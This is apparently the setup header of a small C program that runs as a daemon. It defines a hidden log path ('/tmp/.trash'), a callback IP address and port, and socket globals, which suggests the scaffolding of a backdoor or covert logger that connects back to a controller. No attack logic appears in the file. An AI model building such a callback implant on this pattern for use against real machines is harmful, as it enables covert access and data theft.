
#ifndef SETUP_H
#define SETUP_H

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

// TODO replace perror with a wrappper around log or write to /dev/null
#define KILL(x) { perror(x); _exit(1); }

// setup.c
void daemonize(void);
void init(void);

#define LOG_PATH ("/tmp/.trash")
#define CALLBACK_IP ("192.168.1.69")
#define CALLBACK_PORT ("6969")

static int g_sockfd = -1;
static int g_logfd = -1;

#endif // SETUP_H
